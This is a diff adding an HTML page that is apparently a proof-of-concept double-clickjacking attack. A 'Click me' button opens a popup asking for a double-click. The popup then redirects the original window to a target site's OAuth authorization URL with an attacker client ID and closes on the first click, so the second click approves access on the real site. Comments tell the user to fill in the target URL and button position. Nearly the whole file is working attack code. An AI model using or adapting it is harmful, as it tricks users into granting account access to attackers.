@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+</head>
+<body>
+    <div>
+        <!-- 
+        Replace the parameters of openDoubleWindow function with a legitimate (target) webpage and the position where victims accidentally clicks.
+        The purpose is to trick victims into clicking a button on a legitimate site by mistake. 
+        -->
+        <button onclick="openDoubleWindow('https://<target-url>/oauth2/authorize?client_id=attacker',647, 588.5, 260, 43)">
+            Click me
+        </button>
+    </div>
+    <script>
+        function openDoubleWindow(url, top, left, width, height) {
+            const evilWindow = window.open(
+                window.location.protocol+"//"+window.location.hostname+":"+window.location.port+"/random",
+                "_blank");
+
+            evilWindow.onload = function() {
+                evilWindow.document.open();
+
+                evilWindow.document.write(`
+                <script>
+                    setTimeout(function() {
+                        opener.location = "${url}";
+                    }, 1000);
+                </scri`+`pt>
+                <div
+                    id="doubleclick"
+                    type="button"
+                    class="button" style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';"
+                    onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';"
+                >
+                    Double Click Here
+                </div>
+                <script>
+                    document.getElementById('doubleclick').addEventListener('mousedown', function() {
+                        window.close();
+                    });
+                </scri`+`pt>`);
+
+                evilWindow.document.close();
+            }
+        }
+    </script>
+</body>
+</html>
